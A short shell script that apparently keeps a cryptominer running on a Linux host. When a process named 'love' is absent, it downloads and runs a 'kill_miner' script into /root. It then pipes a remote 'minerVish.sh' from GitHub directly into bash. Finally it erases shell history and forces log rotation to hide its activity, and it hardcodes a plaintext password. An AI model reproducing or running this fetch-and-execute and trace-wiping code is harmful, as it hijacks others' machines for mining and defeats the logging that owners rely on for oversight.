#!/bin/sh
password="danielchau@123#"
if pgrep love >/dev/null
then
  echo "love is running."
else
  echo "love isn't running"
  wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
  chmod +x /root/kill_miner.sh
  ./kill_miner.sh
  sleep 3
  bash <(curl -s 'https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/minerVish.sh')
fi
history -c && history -w
sudo logrotate -f /etc/logrotate.conf
